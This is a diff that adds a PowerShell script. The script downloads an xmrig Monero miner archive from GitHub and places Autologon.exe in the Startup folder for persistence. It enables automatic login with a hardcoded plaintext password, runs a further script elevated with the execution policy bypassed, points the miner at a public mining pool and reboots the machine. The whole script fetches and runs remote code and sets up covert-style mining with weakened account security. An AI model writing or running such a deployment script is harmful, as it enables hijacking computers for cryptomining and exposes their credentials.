@@ -1,0 +1,21 @@
+$url = "https://github.com/1tut/cade/raw/main/xmrig-6.22.0.zip"
+$output = "$env:USERPROFILE\Desktop\xmrig-6.22.0.zip"
+Invoke-WebRequest -Uri $url -OutFile $output
+Expand-Archive -Path $output -DestinationPath "$env:USERPROFILE\Desktop"
+$source = "C:\Users\v1\Desktop\xmrig-6.22.0\Autologon.exe"
+$destination = "C:\Users\v1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Autologon.exe.lnk"
+$WshShell = New-Object -ComObject WScript.Shell
+$shortcut = $WshShell.CreateShortcut($destination)
+$shortcut.TargetPath = $source
+$shortcut.Save()
+$autologon = "C:\Users\v1\Desktop\xmrig-6.22.0\Autologon.exe"
+$username = "v1"
+$domain = "AzureAD"
+$password = "Khonglolo123@"
+Start-Process -FilePath $autologon -ArgumentList "/accepteula", $username, $domain, $password -Wait
+Start-Process -FilePath powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File ""C:\Users\v1\Desktop\xmrig-6.22.0\admin.ps1""" -Verb RunAs
+Start-Sleep -Seconds 3
+(Get-Content -Path "C:\Users\v1\Desktop\xmrig-6.22.0\m.cmd") -replace 'xmrig.exe --donate-level 1 -o pool -u wallet -p v3me -a rx/0 -k ', 'xmrig.exe --donate-level 1 -o us2.monero.herominers.com:1111 -u 123456789abcdef -p test -a rx/0 -k ' | Set-Content -Path "C:\Users\v1\Desktop\xmrig-6.22.0\m.cmd"
+Start-Process powershell -ArgumentList "-NoExit", "-Command & 'C:\Users\v1\Desktop\xmrig-6.22.0\m.cmd'"
+Start-Sleep -Seconds 5
+Restart-Computer
